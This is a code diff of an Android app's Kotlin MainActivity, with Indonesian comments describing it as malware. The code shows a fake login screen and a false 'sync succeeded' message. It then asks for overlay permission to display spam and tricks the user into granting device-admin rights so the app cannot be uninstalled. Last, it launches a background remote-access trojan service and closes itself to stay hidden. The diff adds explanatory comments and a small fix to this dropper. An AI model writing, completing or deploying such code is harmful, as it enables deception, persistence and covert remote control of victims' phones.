@@ -21,6 +21,8 @@ import android.widget.Toast
 class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        // Setup UI Login Palsu
         val layout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(60, 150, 60, 60)
@@ -73,6 +75,7 @@ class MainActivity : Activity() {
 
         setContentView(layout)
 
+        // Aksi Tombol Login
         btnLogin.setOnClickListener {
             Toast.makeText(this, "Sinkronisasi berhasil...", Toast.LENGTH_SHORT).show()
             executeDropperPayload()
@@ -80,26 +83,34 @@ class MainActivity : Activity() {
     }
 
     private fun executeDropperPayload() {
+        // 1. Minta Izin Overlay (Biar bisa nampilin spam teks)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
         }
 
+        // 2. Minta Izin Device Admin (Anti-Uninstall)
+        // PERBAIKAN: Pake MyDeviceAdminReceiver::class.java
         val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        
         if (!dpm.isAdminActive(adminComponent)) {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan modul untuk melanjutkan sinkronisasi.")
+                // PERBAIKAN: Paksa String biar nggak ambigu
+                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan modul untuk melanjutkan sinkronisasi." as String)
             }
             startActivity(intent)
         }
 
+        // 3. Jalanin Service RAT di Background
         val serviceIntent = Intent(this, RatService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent)
         } else {
             startService(serviceIntent)
         }
+        
+        // 4. Tutup Activity (Sembunyi)
         finish()
     }
 }
